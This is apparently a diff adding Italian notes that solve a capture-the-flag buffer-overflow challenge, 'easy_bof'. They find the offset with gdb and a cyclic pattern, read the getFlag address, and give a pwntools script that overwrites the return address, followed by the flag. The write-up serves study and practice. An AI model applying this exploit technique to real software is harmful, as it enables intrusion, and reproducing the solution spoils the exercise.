@@ -1,1 +1,33 @@
+1)easy_bof
+  gdb easy_bof
+  cyclic 100
+  run
+  aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
+  
+  emerge intanto che è un'architettura a 64bit
+  cyclic -l 0x6161616161616165
+  	buff[32]
+  	RBP -> 8 B
+  	RSP ->trasc
+  	RIP
+  
+  checksec
+  	NX        : disabled
+  	
+  In IDA si può osservare che c'è una funzione getFlag; ricavo l'indirizzo da gdb
+  	disass getFlag
+  	=>0x00000000004005c7
+  	
+  Ora ho ciò che mi serve per generare lo script py
+  from pwn import *
+  p=process('./easy_bof')
+  garbage=b'A'*40
+  target=p64(0x00000000004005c7)
+  payload= garbage + target
+  p.sendline(payload)
+  print(p.recvall())
+  
+  =>spritz{bof_for_fun_and_profit?}
 
+	
+	
